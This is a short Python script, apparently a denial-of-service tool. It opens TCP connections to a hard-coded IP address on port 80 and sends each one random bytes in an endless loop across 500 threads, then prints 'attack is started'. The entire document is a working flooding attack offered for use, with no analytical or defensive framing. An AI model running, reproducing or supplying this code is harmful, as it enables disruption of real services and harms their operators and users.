import socket
import threading
import random

target_ip = "104.21.88.251"  # Replace with the target IP
target_port = 80           # Replace with the target port

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            payload = random._urandom(1024)
            s.send(payload)
            s.close()
        except:
            pass

for i in range(500):  # High number of threads for stronger effect
    thread = threading.Thread(target=flood)
    thread.start()
print("attack is started")